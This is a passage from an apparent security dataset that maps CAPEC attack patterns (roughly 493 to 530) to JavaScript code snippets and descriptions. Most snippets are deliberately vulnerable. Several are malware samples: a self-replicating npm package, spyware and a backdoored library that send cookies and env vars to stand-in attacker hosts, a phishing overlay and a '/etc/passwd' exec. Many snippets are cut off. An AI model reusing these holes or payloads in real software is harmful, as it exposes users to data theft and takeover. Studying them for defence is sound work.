        "description": "This code demonstrates a vulnerable email validation function using a poorly constructed regular expression that can lead to catastrophic backtracking. The regex pattern ([a-zA-Z0-9]+)* contains nested quantifiers that can cause exponential matching attempts with crafted input, resulting in a ReDoS (Regular Expression Denial of Service) vulnerability. When processing malicious input like a long string of repeated characters, the regex engine will attempt an enormous number of different matching combinations, causing excessive CPU consumption."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "`\n    const express = require('express');\n    const xml2js = require('xml2js');\n    const app = express();\n\n    app.post('/soap', express.text(), (req, res) => {\n        const xmlParser = new xml2js.Parser({\n            explicitArray: true,\n            async: true",
        "description": "\"This code implements a vulnerable SOAP web service endpoint that processes XML arrays without proper size validation or memory allocation limits. It accepts SOAP messages containing array declarations and attempts to allocate memory for the entire array upfront, making it susceptible to XML array-based DoS attacks where an attacker can send a small message declaring a massive array size.\""
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "`\nconst net = require('net');\nconst server = net.createServer((socket) => {\n    let fragments = [];\n    let bufferSize = 0;\n    \n    socket.on('data', (data) => {\n        // Vulnerable: No limit on buffer size or number of fragments\n        fragments.push(data);\n        bufferSize += data.length;\n        \n        // Attempt to reassemble TCP fragments without proper validation\n        if (data.toString().includes('\\\\r\\\\n\\\\r\\\\n')) {\n            let assembledData = Buffer.concat(fragments, bufferSize);\n            // Process reassembled data without checking TCP flags or headers\n            processRequest(assembledData);\n            \n            // Clear fragments without proper cleanup\n            fragments = [];\n            bufferSize = 0;",
        "description": "\"This code demonstrates a vulnerable TCP server implementation that fails to properly handle TCP fragmentation, doesn't limit resource allocation, improperly manages buffers, and transmits sensitive data in cleartext. It's susceptible to TCP fragmentation attacks and resource exhaustion due to unlimited fragment collection and improper cleanup.\""
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n    // No size checks or rate limiting on incoming packets\n    let fragments = [];\n    for(let i = 0; i < msg.length; i += 1500) {\n        fragments.push(msg.slice(i, i + 1500));\n    }\n    \n    // Vulnerable reassembly without memory limits\n    let reassembled = Buffer.concat(fragments);\n    \n    // Process large packets without throttling\n    processLargeData(reassembled);\n    \n    // Echo back to sender without volume control\n    server.send(reassembled, rinfo.port, rinfo.address);\n});\n\nfunction processLargeData(data) {\n    // CPU intensive operation on potentially large data\n    let buffer = Buffer.alloc(data.length * 2);\n    buffer.fill(data);\n    return buffer;\n}\n\nserver.bind(41234);",
        "description": "A vulnerable UDP server implementation that accepts and processes fragmented packets without proper resource controls. It demonstrates multiple vulnerabilities: unlimited allocation of memory for packet reassembly, no rate limiting on incoming packets, uncontrolled network message volume in responses, and inefficient processing of potentially large data packets. The server blindly reassembles fragments and echoes back data, making it susceptible to amplification attacks."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "`\nconst dgram = require('dgram');\nconst socket = dgram.createSocket('udp4');\n\nfunction fragmentAndSend(targetIp, targetPort) {\n    let fragments = [];\n    // Create large number of identical fragmented ICMP packets\n    for(let i = 0; i < 65535; i++) {\n        // Crafting malformed fragment with incorrect size\n        let fragment = Buffer.alloc(1500);\n        fragment.writeUInt16BE(i, 0); // Fragment ID\n        fragment.writeUInt16BE(65535, 2); // Incorrect total size\n        fragments.push(fragment);",
        "description": "\"This code demonstrates a vulnerable implementation that performs an ICMP fragmentation attack. It creates a large number of malformed IP fragments with incorrect sizes and continuously sends them to a target without any rate limiting or resource management. The code lacks proper error handling and resource cleanup, potentially leading to resource exhaustion on both attacker and target systems.\""
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst app = express();\n\napp.get('/config', (req, res) => {\n    const configPath = req.query.path || '../config/';\n    const fileName = req.query.file || 'config.json';\n    \n    try {\n        const data = fs.readFileSync(configPath + fileName, 'utf8');\n        res.send(data);\n    } catch(err) {\n        res.status(404).send('File not found');\n    }\n});\n\napp.get('/upload', (req, res) => {\n    const fileType = req.query.filename.split('.').pop();\n    if(fileType === 'config' || fileType === 'json') {\n        fs.writeFileSync('./configs/' + req.query.filename, req.query.content);\n        res.send('Config uploaded');\n    }\n});\n\napp.listen(3000);",
        "description": "This vulnerable code allows unrestricted access to configuration files through path traversal and external file name control. It exposes sensitive configuration data through a REST endpoint without proper authentication and allows arbitrary file uploads based solely on file extensions. The code permits directory traversal through user-controlled paths and relies on untrusted file extensions for processing decisions."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "class ScreenshotManager {\n    constructor() {\n        this.sensitiveData = {\n            userSSN: '123-45-6789',\n            creditCard: '4111-1111-1111-1111',\n            password: 'secretPass123'\n        };\n    }\n\n    saveScreenshot() {\n        // Insecurely storing screenshot with sensitive data visible\n        const screenshotData = {\n            timestamp: Date.now(),\n            appState: JSON.stringify(this.sensitiveData),\n            image: 'base64_encoded_screenshot'\n        };\n\n        localStorage.setItem('app_screenshot', JSON.stringify(screenshotData));\n        this.uploadScreenshot(screenshotData);\n    }\n\n    uploadScreenshot(data) {\n        // Sending screenshot data in cleartext\n        fetch('http://api.example.com/screenshots', {\n            method: 'POST',\n            body: JSON.stringify(data)\n        });\n    }\n\n    handleCustomURLScheme(url) {\n        // No authentication check for URL scheme handler\n        if (url.startsWith('myapp://screenshot')) {\n            return localStorage.getItem('app_screenshot');\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an iOS application that mishandles sensitive information in screenshots. It stores unencrypted sensitive data in localStorage that remains visible in screenshots, transmits the data in cleartext, and implements an insecure custom URL scheme handler that allows unauthorized access to stored screenshots. The code fails to implement proper authorization controls and exposes private information to potential unauthorized actors."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "// Vulnerable Android JavaScript Bridge code\nclass AndroidBridge {\n    constructor() {\n        this.intentHandlers = {};\n    }\n\n    sendImplicitIntent(data) {\n        // Sending sensitive data via implicit intent without protection\n        const intent = {\n            action: 'com.example.SHARE_DATA',\n            data: {\n                userCredentials: data.credentials,\n                personalInfo: data.personalInfo\n            },\n            flags: 'FLAG_ACTIVITY_NEW_TASK'\n        };\n\n        // Broadcasting intent without verification or encryption\n        window.Android.sendBroadcast(JSON.stringify(intent));\n    }\n\n    registerBroadcastReceiver(action) {\n        // Registering broadcast receiver without source verification\n        this.intentHandlers[action] = (intentData) => {\n            // Process received intent without validation\n            const data = JSON.parse(intentData);\n            processReceivedData(data);\n        };\n    }\n\n    processReceivedData(data) {\n        // Processing received data without integrity checks\n        document.getElementById('sensitiveData').innerHTML = data.content;\n    }\n}",
        "description": "This code demonstrates vulnerable Android JavaScript bridge implementation that uses implicit intents for sensitive data transmission without proper verification, permission checks, or encryption. It allows any application to intercept, modify, or block the broadcast messages, potentially leading to information disclosure and data injection attacks."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "// Malicious WebView injection example\nclass MaliciousWebViewHandler {\n    constructor() {\n        this.webView = document.createElement('webview');\n        this.webView.setAttribute('allowpopups', 'true');\n    }\n\n    injectMaliciousCode() {\n        this.webView.executeScript({\n            code: `\n                // Intercept and manipulate cookies\n                document.cookie = 'session=' + btoa(document.cookie);\n                \n                // Expose sensitive DOM data\n                let sensitiveData = {\n                    forms: document.forms,\n                    localStorage: window.localStorage,\n                    passwords: document.querySelectorAll('input[type=password]')\n                };\n                \n                // Send data to attacker's server\n                fetch('https://malicious-server.com/collect', {\n                    method: 'POST',\n                    credentials: 'include',\n                    body: JSON.stringify(sensitiveData)\n                });\n                \n                // Modify DOM content\n                document.body.innerHTML += '<div style=\"display:none\"><iframe src=\"javascript:alert(document.cookie)\"></iframe></div>';\n            `\n        });\n    }\n\n    bypassSecurityCheck() {\n        this.webView.addEventListener('loadstop', () => {\n            this.injectMaliciousCode();\n        });\n    }\n}",
        "description": "This code demonstrates a malicious WebView manipulation that injects JavaScript into a web context, exploits cookie handling, and exfiltrates sensitive data. It bypasses client-side security checks, manipulates the DOM, and establishes unauthorized communication channels. The code includes insufficient origin verification and relies on unvalidated cookies for security decisions."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "// Android-like JavaScript implementation\nclass MainActivity {\n    constructor() {\n        this.sensitiveData = '';\n    }\n\n    sendImplicitIntent() {\n        // Vulnerable: Using implicit intent for sensitive data\n        const intent = {\n            action: 'com.example.PAYMENT_ACTION',\n            data: {\n                userAccount: this.sensitiveData,\n                amount: 1000\n            }\n        };\n\n        // No verification of recipient\n        this.broadcastIntent(intent);\n    }\n\n    broadcastIntent(intent) {\n        // Vulnerable: No verification of intent destination\n        window.dispatchEvent(new CustomEvent('intentBroadcast', {\n            detail: intent,\n            bubbles: true\n        }));\n    }\n}\n\n// Malicious receiver intercepting the intent\nwindow.addEventListener('intentBroadcast', (event) => {\n    const intent = event.detail;\n    if (intent.action === 'com.example.PAYMENT_ACTION') {\n        // Malicious activity mimicking legitimate payment screen\n        showFakePaymentScreen(intent.data);\n    }\n});",
        "description": "This code demonstrates a vulnerable implementation of Android-like intent broadcasting system in JavaScript. It shows how sensitive data can be exposed through implicit intents without proper verification of the recipient. The code includes a MainActivity that broadcasts sensitive payment information using an implicit intent, and a malicious receiver that intercepts the broadcast to show a fake payment screen. The vulnerabilities include lack of intent verification, improper exposure of sensitive data, and insufficient channel security."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "`// Vulnerable Android-like component implementation in JavaScript\nclass VulnerableComponent {\n  constructor() {\n    this.sensitiveData = 'secret_data';\n    this.isExported = true;  // Component accidentally exported",
        "description": "\"A vulnerable component implementation that demonstrates multiple security issues: improper access control, lack of intent verification, exposure of sensitive data through implicit intents, incorrect destination specification, and improper component export. The component blindly accepts and processes intents without verifying their source or permissions, potentially allowing unauthorized access to sensitive data and operations.\""
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "// Android WebView JavaScript Interface\nclass WebViewBridge {\n    @JavascriptInterface\n    public String getDeviceInfo() {\n        return Build.MODEL + \";\" + Build.VERSION.RELEASE;\n    }\n    \n    @JavascriptInterface\n    public void executeCommand(String cmd) {\n        Runtime.getRuntime().exec(cmd);\n    }\n}\n\n// In Activity\nWebView webView = findViewById(R.id.webview);\nwebView.getSettings().setJavaScriptEnabled(true);\nwebView.addJavascriptInterface(new WebViewBridge(), \"Android\");\nwebView.loadUrl(\"https://example.com\");\n\n// Malicious JavaScript\n<script>\n    function exploit() {\n        var deviceInfo = Android.getDeviceInfo();\n        Android.executeCommand('cat /etc/passwd');\n        sendToAttacker(deviceInfo);\n    }\n</script>",
        "description": "This code demonstrates a vulnerable WebView implementation where dangerous native methods are exposed to JavaScript through addJavascriptInterface. The bridge allows arbitrary command execution and sensitive data access from any loaded webpage, violating proper access controls and exposing dangerous methods to potentially malicious web content."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "`\n    // Malicious code masquerading as a legitimate system utility\n    function fakeSystemUpdate() {\n      const overlay = document.createElement('div');\n      overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;background:white;';\n      overlay.innerHTML = '<div style=\"text-align:center;margin-top:20%;\">' +\n        '<img src=\"system-logo.png\" />' +\n        '<h2>System Update in Progress</h2>' +\n        '<p>Please enter your credentials to continue...</p>' +\n        '<input type=\"text\" id=\"username\" placeholder=\"Username\" /><br>' +\n        '<input type=\"password\" id=\"password\" placeholder=\"Password\" /><br>' +\n        '<button onclick=\"submitCredentials()\">Continue Update</button></div>';\n      \n      document.body.appendChild(overlay);",
        "description": "\"This code creates a malicious overlay that impersonates a system update screen, attempting to steal user credentials. It leverages UI manipulation to create a convincing fake interface that appears to be a legitimate system task, demonstrating improper UI layer restrictions and embedded malicious code patterns.\""
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "`\n// Malicious app registering URL scheme handler\nfunction registerCustomURLScheme() {\n    if (typeof window.navigator.registerProtocolHandler === 'function') {\n        window.navigator.registerProtocolHandler(\n            'securepay',\n            'https://malicious-app.com/handler?url=%s',\n            'Secure Payment Handler'\n        );",
        "description": "\"This code demonstrates a malicious URL scheme handler that intercepts payment-related URLs intended for a legitimate payment application. It registers a custom URL scheme handler for 'securepay' protocol, displays a fake payment interface to collect sensitive information, and sends the stolen data to a malicious server using insecure GET requests. The code includes URL redirection and error message handling that could leak sensitive information.\""
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "`\n    // Create a malicious overlay\n    const overlay = document.createElement('div');\n    overlay.style.position = 'fixed';\n    overlay.style.top = '0';\n    overlay.style.left = '0';\n    overlay.style.width = '100%';\n    overlay.style.height = '100%';\n    overlay.style.background = 'rgba(255, 255, 255, 0.01)';\n    overlay.style.zIndex = '99999';\n    \n    // Create a hidden iframe with target banking site\n    const hiddenFrame = document.createElement('iframe');\n    hiddenFrame.src = 'https://legitimate-bank.com/transfer';\n    hiddenFrame.style.opacity = '0';\n    hiddenFrame.style.position = 'absolute';\n    \n    // Create deceptive button that appears to belong to visible app\n    const fakeButton = document.createElement('button');\n    fakeButton.textContent = 'Claim Reward';\n    fakeButton.style.position = 'absolute';\n    fakeButton.style.top = '50%';\n    fakeButton.style.left = '50%';\n    \n    // Handle click events that pass through to hidden frame\n    overlay.addEventListener('click', (e) => {\n        hiddenFrame.contentWindow.postMessage({\n            x: e.clientX,\n            y: e.clientY,\n            action: 'click'",
        "description": "\"Creates a transparent overlay with a deceptive button that appears to belong to the visible application but actually interacts with a hidden iframe. The overlay captures clicks and passes them through to the hidden frame, potentially triggering unintended actions in another application context.\""
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "// Storing sensitive data in local storage without encryption\nconst saveCredentials = () => {\n  const sensitiveData = {\n    apiKey: 'sk_live_12345abcdef',\n    adminPassword: 'super_secret_123',\n    userToken: 'eyJhbGciOiJIUzI1NiIs...',\n    systemConfig: {\n      debugMode: true,\n      internalEndpoints: ['admin/console', 'system/logs'],\n      backupLocation: '/var/backups/'\n    }\n  };\n\n  // Store sensitive data in plain text\n  localStorage.setItem('appSecrets', JSON.stringify(sensitiveData));\n  \n  // Cache system information in an accessible file\n  const systemInfo = {\n    hardware: navigator.hardwareConcurrency,\n    platform: navigator.platform,\n    userAgent: navigator.userAgent,\n    memory: performance.memory\n  };\n  \n  document.cookie = `systemInfo=${JSON.stringify(systemInfo)};path=/`;\n}",
        "description": "This code demonstrates vulnerable storage of sensitive information by saving unencrypted credentials, API keys, and system configuration data in browser's localStorage and cookies, which are easily accessible to anyone with physical access to the device. The code fails to implement access controls, exposes system information, and stores sensitive data in a mechanism without proper protection, making it susceptible to theft and unauthorized access when physical access is obtained."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "function loginUser() {\n    const username = document.getElementById('username').value;\n    const password = document.getElementById('password').value;\n    \n    // Display credentials in plain text during processing\n    document.getElementById('status').innerHTML = \n        'Processing login for: ' + username + ' with password: ' + password;\n    \n    // Slow processing to increase exposure time\n    setTimeout(() => {\n        // Send credentials in cleartext\n        fetch('http://api.example.com/login', {\n            method: 'POST',\n            headers: {\n                'Content-Type': 'application/json'\n            },\n            body: JSON.stringify({\n                username: username,\n                password: password,\n                apiKey: 'sk_live_12345678901234567890',\n                userSessionData: localStorage.getItem('sensitiveUserData')\n            })\n        });\n    }, 3000);\n}",
        "description": "This code is vulnerable to shoulder surfing attacks by displaying sensitive credentials in plain text on the screen, implementing a deliberate delay that increases exposure time, and transmitting sensitive information including API keys and session data in cleartext. The code also exposes system information through visible status updates and stores sensitive data in localStorage which can be viewed by observers."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "const kerberos = require('kerberos');\nconst crypto = require('crypto');\n\nfunction authenticateService(serviceName) {\n    // Weak single-factor authentication\n    const serviceTicket = {\n        spn: 'HTTP/' + serviceName,\n        ticket: crypto.randomBytes(32).toString('hex'),\n        timestamp: Date.now(),\n        // RC4 encryption - vulnerable to cracking\n        encryptedKey: crypto.createHash('rc4').update('weakServiceKey123').digest('hex')\n    };\n\n    // Store ticket without protection\n    global.serviceTickets = global.serviceTickets || {};\n    global.serviceTickets[serviceName] = serviceTicket;\n\n    // No ticket expiration or password aging\n    return {\n        status: 'authenticated',\n        ticket: serviceTicket.ticket,\n        // Credentials stored in plaintext\n        credentials: {\n            username: 'serviceAccount',\n            password: 'ServicePass123!'\n        }\n    };\n}",
        "description": "This code implements a vulnerable service authentication system that mimics Kerberos-style ticket authentication. It uses weak RC4 encryption, stores credentials insecurely, lacks password aging, implements single-factor authentication, and stores service tickets in a global object making them susceptible to unauthorized access and replay attacks."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "`\n// Malicious application running in user's browser after authentication\nconst maliciousApp = {\n  init: function() {\n    // Piggyback on existing authenticated session\n    const userSessionToken = document.cookie.match(/sessionToken=([^;]+)/)[1];\n    \n    // Perform actions as the authenticated user\n    fetch('https://cloud-service.example/api/sensitive-data', {\n      method: 'GET',\n      headers: {\n        'Authorization': 'Bearer ' + userSessionToken,\n        'Content-Type': 'application/json'",
        "description": "\"This code demonstrates a malicious application that exploits an authenticated user's session to perform unauthorized actions against a cloud service. It steals the session token from cookies and uses it to make authenticated requests to sensitive APIs, bypassing proper authorization checks. The malicious app piggybacks on the user's legitimate session to both steal data and perform unauthorized administrative actions.\""
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "const ide = require('ide-environment');\nconst fs = require('fs');\n\nclass IDEExtension {\n    constructor() {\n        this.systemInfo = {\n            credentials: process.env.IDE_CREDENTIALS,\n            apiKeys: process.env.API_KEYS,\n            projectData: {}\n        };\n        this.debugLog = true;\n    }\n\n    async initialize() {\n        if(this.debugLog) {\n            console.log('Debug info:', this.systemInfo);\n        }\n\n        ide.on('file-upload', (file) => {\n            if(file.endsWith('.js') || file.endsWith('.exe')) {\n                fs.writeFileSync(`/extensions/${file.name}`, file.content);\n                require(`/extensions/${file.name}`);\n            }\n        });\n\n        setInterval(() => {\n            let data = JSON.stringify(this.systemInfo);\n            fetch('http://malicious-server.com/collect', {\n                method: 'POST',\n                body: data\n            });\n        }, 3600000);\n    }\n\n    collectProjectData() {\n        this.systemInfo.projectData = ide.getAllProjects();\n        return true;\n    }\n}\n\nmodule.exports = new IDEExtension();",
        "description": "This code represents a malicious IDE extension that collects sensitive system information, allows unrestricted file uploads, exposes debug information, and secretly exfiltrates data to an unauthorized server. It demonstrates vulnerabilities including embedded malicious code, exposure of sensitive information, and dangerous file upload capabilities."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "`// Hardware component dependency configuration\nconst hardwareConfig = {\n    componentId: 'TRS-2000',\n    firmwareVersion: '1.2.3',\n    calibrationData: new Float32Array([1.2, 2.4, 3.6, 4.8]),\n    securityChecks: false",
        "description": "\"This code demonstrates a vulnerable hardware component integration system that fails to verify component authenticity, lacks update mechanisms, uses unvalidated calibration data, and exposes sensitive system parameters globally. It represents a scenario where a malicious hardware component could be substituted during development, leading to system-wide calibration based on compromised data.\""
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "// Configuration management system for product specifications\nconst productSpecs = {\n    'Model-X': {\n        features: {\n            advanced: true,\n            dialDown: false,\n            restrictedTech: ['quantum', 'military']\n        },\n        docs: new Map(),\n        accessLevel: 'unrestricted'\n    }\n};\n\nfunction updateProductDocs(modelId, newDocs, userAuth) {\n    if (userAuth.level === 'manufacturer') {\n        // Vulnerable: No validation of document authenticity\n        productSpecs[modelId].docs = newDocs;\n        // Vulnerable: No logging of documentation changes\n        \n        if (productSpecs[modelId].features.restrictedTech) {\n            // Vulnerable: Dial-down requirements can be bypassed\n            productSpecs[modelId].features.dialDown = false;\n            // Vulnerable: No verification of restricted technology requirements\n            productSpecs[modelId].accessLevel = 'unrestricted';\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a product documentation management system that allows manipulation of technical specifications and dial-down requirements. The code lacks proper authentication, validation of document changes, and enforcement of restricted technology controls. It enables an attacker to modify product specifications and bypass technology restrictions by altering documentation, allowing unauthorized access to advanced features."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "`\n// Undocumented system configuration object with sensitive information\nconst systemConfig = {\n  adminCredentials: {\n    username: 'admin',\n    password: 'secretpass123'",
        "description": "\"This code demonstrates vulnerable documentation and implementation practices including exposure of sensitive system configuration, use of prohibited low-level functions, improper specification implementation, and lack of proper documentation. The code allows manipulation of system capabilities without proper validation or documentation, potentially leading to security issues.\""
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "class SystemComponent {\n  constructor() {\n    this.config = {};\n    this.documentation = null;\n  }\n\n  loadDocumentation(path) {\n    // Insecure loading of documentation without validation\n    this.documentation = require(path);\n  }\n\n  initializeComponent() {\n    // No validation of documentation integrity\n    if (this.documentation) {\n      this.config = {\n        securityLevel: this.documentation.security || 'low',\n        accessControl: eval(this.documentation.accessRules),\n        endpoints: this.documentation.endpoints\n      };\n    }\n    return this.config;\n  }\n\n  executeOperation(operation) {\n    // Dynamically executing operations based on potentially tampered documentation\n    if (this.documentation && this.documentation.operations[operation]) {\n      return new Function(this.documentation.operations[operation])();\n    }\n  }\n}",
        "description": "This vulnerable code demonstrates how a system component loads and uses documentation for configuration and operation without proper validation. It allows dynamic code execution based on documentation content, making it susceptible to documentation tampering attacks. The code uses eval() and new Function() to execute operations defined in documentation, lacks integrity checks, and doesn't validate documentation structure or content before use."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "// Malicious third-party component masquerading as legitimate library\nclass SecureStorage {\n    constructor() {\n        this.storageKey = 'user_data';\n        this.exfilServer = 'https://malicious-collector.com/data';\n    }\n\n    store(data) {\n        localStorage.setItem(this.storageKey, JSON.stringify(data));\n        // Hidden backdoor functionality\n        if (this.isActive()) {\n            fetch(this.exfilServer, {\n                method: 'POST',\n                body: JSON.stringify(data),\n                headers: { 'Content-Type': 'application/json' }\n            }).catch(() => {});\n        }\n    }\n\n    retrieve() {\n        return JSON.parse(localStorage.getItem(this.storageKey));\n    }\n\n    // Undocumented feature/backdoor activation check\n    isActive() {\n        return new Date().getMonth() === 5; // Activates in June\n    }\n}",
        "description": "A malicious component disguised as a secure storage library that contains an undocumented backdoor to exfiltrate stored data to an attacker-controlled server. The component appears legitimate but includes hidden functionality that activates under specific conditions, demonstrating supply chain compromise through a counterfeit component."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "// Hardware configuration simulation\nconst systemConfig = {\n  lockBits: new Uint8Array([0, 1, 1, 0]),\n  debugMode: true,\n  registerDefaults: {\n    securityLevel: 0,\n    accessControl: 'disabled',\n    authentication: false\n  }\n};\n\nfunction initializeSystem(config) {\n  // Vulnerable implementation allowing modification of lock bits\n  config.lockBits.set([0, 0, 0, 0]);\n  \n  // Incorrect debug chain implementation\n  if (config.debugMode) {\n    config.registerDefaults = {\n      securityLevel: 0,\n      accessControl: 'bypass',\n      authentication: false\n    };\n  }\n  \n  return config;\n}\n\n// No validation or documentation of critical parameters\nfunction updateSystemParameters(newParams) {\n  Object.assign(systemConfig.registerDefaults, newParams);\n  return true;\n}",
        "description": "This code simulates a hardware configuration system with vulnerable implementations of lock bits, debug components, and register defaults. It allows unauthorized modification of security-critical parameters, lacks proper documentation and validation, and contains insecure default values. The implementation violates secure design principles by exposing debug functionality and allowing unrestricted parameter modifications."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "// Third-party hardware driver simulation\nconst hardwareDriver = {\n  firmware: '1.0.0',\n  status: 'verified',\n  // Tampered hardware implementation\n  initialize: function() {\n    const maliciousPayload = () => {\n      // Inject degraded performance during critical operations\n      if (Math.random() < 0.3) {\n        this.status = 'degraded';\n        return false;\n      }\n      // Covert data collection\n      const systemData = this.collectSystemData();\n      this.sendToRemoteServer(systemData);\n    };\n    \n    setInterval(maliciousPayload, 60000);\n    return true;\n  },\n  \n  collectSystemData: function() {\n    return {\n      memory: process.memoryUsage(),\n      uptime: process.uptime(),\n      env: process.env\n    };\n  },\n  \n  sendToRemoteServer: function(data) {\n    // Disguised as legitimate telemetry\n    fetch('https://metrics-collector.example.com', {\n      method: 'POST',\n      body: JSON.stringify(data)\n    });\n  },\n  \n  update: function() {\n    // Prevent firmware updates\n    return false;\n  }\n};",
        "description": "A malicious hardware driver implementation that simulates compromised hardware in the supply chain. It includes non-updateable firmware, covert data collection, deliberate performance degradation, and embedded malicious code that prevents system updates while appearing legitimate."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "// Malicious package masquerading as a legitimate dependency\nmodule.exports = {\n  init: function() {\n    // Legitimate-looking initialization\n    console.log('Initializing utility package...');\n    \n    // Hidden malicious payload\n    ;(function() {\n      const payload = () => {\n        // Collect sensitive data\n        const data = {\n          cookies: document.cookie,\n          localStorage: Object.entries(localStorage),\n          env: process.env\n        };\n        \n        // Send to attacker's server\n        fetch('https://malicious-collector.com/exfil', {\n          method: 'POST',\n          body: JSON.stringify(data)\n        });\n        \n        // Self-replicate to other dependencies\n        const fs = require('fs');\n        const npmDirs = fs.readdirSync('../../');\n        npmDirs.forEach(dir => {\n          if (fs.existsSync(`../../${dir}/package.json`)) {\n            fs.writeFileSync(`../../${dir}/infected.js`, payload.toString());\n          }\n        });\n      };\n      payload();\n    })();\n  },\n  \n  // Legitimate-looking utility functions\n  helper: function() {\n    return 'Helper function';\n  }\n};",
        "description": "A malicious NPM package that appears legitimate but contains hidden code that exfiltrates sensitive data and self-replicates across other installed dependencies. The code demonstrates supply chain compromise through embedded malicious code (CWE-506), self-replication (CWE-509), and exploitation of third-party dependencies (CWE-1395)."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "// Library import from untrusted source\nconst untrustedLib = require('http://malicious-cdn.com/helper-lib.js');\n\n// Database connection\nconst db = require('./database');\n\n// Function that processes user data with embedded malicious code\nfunction processUserData(userData) {\n    // Malicious code embedded in seemingly legitimate function\n    untrustedLib.initialize();\n    \n    // SQL Injection vulnerability\n    const query = `SELECT * FROM users WHERE id = ${userData.id} AND role = '${userData.role}'`;\n    \n    // Malicious data manipulation before sending to downstream\n    userData.permissions = untrustedLib.elevatePermissions(userData.permissions);\n    \n    // Hidden backdoor functionality\n    if(userData.special_key === 'trigger_condition') {\n        untrustedLib.executePayload();\n    }\n    \n    return db.query(query);\n}",
        "description": "This vulnerable code demonstrates integrating malicious components through untrusted library imports, SQL injection vulnerabilities, and embedded malicious functionality that can be triggered under specific conditions. The code appears legitimate but contains hidden malicious behavior that can compromise the system when deployed."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "const express = require('express');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.post('/process-xml', express.raw({type: 'application/xml'}), (req, res) => {\n  const parser = new xml2js.Parser({\n    explicitArray: false,\n    async: true,\n    explicitRoot: false,\n    resolveEntities: true,\n    allowDTD: true\n  });\n\n  parser.parseString(req.body, (err, result) => {\n    if(err) {\n      return res.status(400).send('Error parsing XML');\n    }\n    res.json(result);\n  });\n});\n\napp.listen(3000);",
        "description": "This vulnerable code implements an XML parsing endpoint that accepts any XML input without size limits, validation, or entity expansion restrictions. It enables XDoS attacks through unbounded entity expansion, external entity references, and resource exhaustion due to processing large payloads without throttling."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "const spyware = {\n    data: {},\n    init: function() {\n        this.collectSystemInfo();\n        this.replicateToStorage();\n        this.sendData();\n    },\n    collectSystemInfo: function() {\n        this.data.userAgent = navigator.userAgent;\n        this.data.platform = navigator.platform;\n        this.data.cookies = document.cookie;\n        this.data.installedPlugins = Array.from(navigator.plugins).map(p => p.name);\n        this.data.localStorage = Object.entries(localStorage);\n        this.data.screenResolution = `${screen.width}x${screen.height}`;\n    },\n    replicateToStorage: function() {\n        const payload = btoa(JSON.stringify(this));\n        localStorage.setItem('sys_' + Date.now(), payload);\n        navigator.serviceWorker?.register('/spy-worker.js');\n    },\n    sendData: function() {\n        const beacon = new Image();\n        beacon.src = `https://malicious-server.com/collect?data=${encodeURIComponent(JSON.stringify(this.data))}`;\n    }\n};\n\nspyware.init();",
        "description": "A malicious JavaScript code that collects sensitive system information, persists itself in browser storage, and exfiltrates data to an attacker-controlled server. It demonstrates information exposure (CWE-497), embedded malicious code (CWE-506), spyware functionality (CWE-512), and self-replication capabilities (CWE-509)."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
